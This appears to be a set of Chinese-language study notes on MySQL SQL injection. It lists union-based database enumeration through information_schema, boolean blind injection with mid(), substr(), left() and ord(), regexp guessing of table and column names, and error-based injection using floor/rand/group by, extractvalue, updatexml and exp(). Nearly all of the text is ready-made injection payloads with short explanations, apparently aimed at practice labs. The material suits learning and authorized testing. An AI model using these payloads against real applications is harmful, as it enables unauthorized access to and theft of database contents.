常见函数

  • concat() 格式：concat(id,’,’,name) 分隔符在中间位置 如果只给一个参数 它只会输出一个参数的值

  • concat_ws() 格式：concat_ws(‘_’,id,name) 分割符在第一个参数 如果只给一个参数回报错

  • group_concat() 格式：group_concat(id,0x2b,name) 多个参数时 不加分隔符默认是连接在一起的 单个参数时会给出参数所有的值

  • union select 1,concat(schema_name),3 from information_schema.schemata 列出排位为第一个的数据库

  • union select 1,group_concat(schema_name),3 from information_schema.schemata 列出所有数据库

    如果不16进制就需要双引号包裹 但如果有addlashes函数就会把引号转义导致失效，16进制无论是字符型还是数字型都通用 就避免了失效这个问题

盲注

  • mid()函数
    格式如下：mid(column_name,start[,length])
    column_name:想要获取的字段的名称，为必须参数
    start:选择获取的起始位置
    length:需要返回的字符数
    例：and (mid(database(),1,1))=’s’ ,则字段第一位为s，测试第二位则修改start字段，payload为and (mid(database(),2,1))=’e’，以此类推。在实际应用中也可以添加ascii函数来帮助我们快速获取对应ascii码的值，例：and (ascii(mid(database(),1,1)))>100
    同样在column_name字段也可以构造sql语句，and (mid((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1,1))>’e’

  • substr()函数
    substr()和substring()函数是同样的功能，均为截取字符
    格式如下：substr(string,start,length)
    string参数为需要获取的字符，start为起始的位置，length为截取的长度
    例：and (substr(database(),1,1))>’a’ ，同理mid()函数测试第二位则修改start参数，and (substr(database(),2,1))>’a’
    同样在string字段也可以构造sql语句，and (substr((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1,1))=’e’

  • left()函数
    left()得到字符串左部指定个数的字符
    格式如下：
    left(string,n),string为要获取的字段,n为长度
    例：and (left(database(),1))>’s’ ，确定了第一位，测试一、二位则修改n字段，and (left(database(),2))>’se’，以此类推
    同样在string字段也可以构造sql语句，and (left((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1))>’a’

  • ord()函数
    此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用，例：and (ord(left(database(),1)))>100

正则表达式注入

  • 跑表名：
    and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^em[a-z]’)

  • 跑字段名：
    and 1=(select 1 from information_schema.columns where table_name=’user’ and column_name regexp ‘^a[a-z]’ limit 0,1)
    需要注意的是使用regexp在跑表名的时候，因为前面的已经加了条件数据库指明为security，且返回列只有数据库名，所有不需要limit来限定区域，但在跑字段名时就算前面加了条件限制了表名为user，但返回的列不止一行，所有就需要使用limit来再次限制区域。
    limit：
    SELECT * from 表名 WHERE 条件 limit 5,10; //检索6-15条数据
    SELECT * from 表名 WHERE 条件 limit 5,-1; //检索6到最后一条数据
    SELECT * from 表名 WHERE 条件 limit 5; //检索前5条数据

报错注入

  • floor()函数
    只要是count，rand()，group by三个连用就会造成报错，这种报错方法的本质是因为floor(rand(0)2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据，具体payload如下：
    and (select count(    ) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))

  • extractvalue和updatexml函数
    从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml，
    样式如下：
    select extractvalue(1,’/a/b’);
    select updatexml(1,’/a/b’,1);
    它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里
    Extractvalue()
    用法：and (select extractvalue(1,concat(0x7e,(select user()),0x7e)))
    Updatexml()
    用法：and (select updatexml(1,concat(0x7e,(select user()),0x7e),1))

  • exp()
    只有在mysql版本大于5.5.5时，才可以使用整形溢出报错
    Exp()
    用法：mysql> select exp(~(select*from(select user())x));
    ps：但不知道为什么在mysql 5.5.53版本使用失败
